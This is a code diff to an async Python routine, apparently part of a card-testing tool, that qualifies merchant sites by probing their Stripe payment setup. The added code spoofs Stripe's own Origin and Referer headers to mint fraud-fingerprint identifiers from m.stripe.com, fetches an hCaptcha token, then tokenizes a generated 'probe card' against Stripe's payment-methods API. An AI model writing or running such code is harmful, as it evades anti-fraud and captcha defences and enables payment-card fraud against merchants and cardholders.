@@ -111,17 +111,28 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                 if not pk or (not upe_nonce and not legacy_nonce):
                     return None
 
-                # === STAGE 4: Live Mode Probe — v2021 telemetry + m-cookie prefetch ===
-                telem = gc.stripe_telemetry(base, pk)
-                probe = gc.gen_probe_card()
-                tok_body = gc.tokenize_body(probe, telem, base)
-
+                # === STAGE 4: Live Mode Probe — v2021 telemetry + beacon-POST mint ===
+                # Серверные fingerprint-токены из JSON ответа m.stripe.com/6
+                live_ids = {"muid": "", "sid": "", "guid": ""}
                 try:
-                    await s.get("https://m.stripe.com/6",
-                                headers={"Origin": base, "Referer": f"{base}/", "Accept": "*/*"},
-                                timeout=5)
+                    r_m = await s.post("https://m.stripe.com/6",
+                                       data=gc.m_stripe_beacon_payload(),
+                                       headers={"Origin": "https://js.stripe.com",
+                                                "Referer": "https://js.stripe.com/", "Accept": "*/*"},
+                                       timeout=5)
+                    if r_m.status_code == 200:
+                        live_ids = gc.parse_m_stripe_response(r_m.json())
                 except Exception:
                     pass
+
+                telem = gc.stripe_telemetry(base, pk, muid=live_ids["muid"], sid=live_ids["sid"])
+                if live_ids["guid"]:
+                    telem["guid"] = live_ids["guid"]
+                hc_token = await gc.fetch_hcaptcha_radar_token(s, pk, base)
+                if hc_token:
+                    telem["_hcaptcha_token"] = hc_token
+                probe = gc.gen_probe_card()
+                tok_body = gc.tokenize_body(probe, telem, base)
 
                 r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                                      data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=8)
